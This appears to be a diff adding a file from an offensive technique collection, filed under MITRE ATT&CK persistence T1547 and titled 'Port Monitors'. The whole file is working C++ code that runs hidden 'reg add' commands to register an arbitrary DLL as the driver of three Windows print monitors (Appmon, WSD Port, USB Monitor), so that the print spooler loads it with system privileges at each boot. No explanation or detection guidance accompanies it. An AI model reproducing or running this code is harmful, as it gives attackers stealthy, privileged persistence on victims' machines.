@@ -1,0 +1,77 @@
+---
+title: ".010.Port Monitors"
+folder: "05. Persistence/T1547 Boot or Logon Autostart Execution"
+---
+
+
+#include <windows.h>
+#include <shobjidl.h>
+#include <objbase.h>
+#include <windows.h>
+#include <shobjidl.h>
+#include <shlguid.h>
+#include <initguid.h>
+#include <string>
+#include <fstream>
+#include <iostream>
+
+void AppMon() {
+
+    const char* command = "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors\\Appmon\" /v \"Driver\" /t REG_SZ /d \"C:\\Users\\User\\Desktop\\KimJestem.dll\" /f";
+    STARTUPINFOA si = {};
+    si.cb = sizeof(STARTUPINFOA);
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE;
+
+    PROCESS_INFORMATION pi;
+
+
+    if (CreateProcessA(NULL, const_cast<LPSTR>(command), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
+        WaitForSingleObject(pi.hProcess, INFINITE);
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+    }
+}
+void WSDport() {
+
+    const char* command = "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors\\WSD Port\" /v \"Driver\" /t REG_SZ /d \"C:\\Users\\User\\Desktop\\KimJestem.dll\" /f";
+    STARTUPINFOA si = {};
+    si.cb = sizeof(STARTUPINFOA);
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE;
+
+    PROCESS_INFORMATION pi;
+
+
+    if (CreateProcessA(NULL, const_cast<LPSTR>(command), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
+        WaitForSingleObject(pi.hProcess, INFINITE);
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+    }
+}
+void USBMonitor() {
+
+    const char* command = "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors\\USB Monitor\" /v \"Driver\" /t REG_SZ /d \"C:\\Users\\User\\Desktop\\KimJestem.dll\" /f";
+    STARTUPINFOA si = {};
+    si.cb = sizeof(STARTUPINFOA);
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE;
+
+    PROCESS_INFORMATION pi;
+
+
+    if (CreateProcessA(NULL, const_cast<LPSTR>(command), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
+        WaitForSingleObject(pi.hProcess, INFINITE);
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+    }
+}
+
+
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+
+    AppMon();
+    WSDport();
+    USBMonitor();
+    return 0;
+}
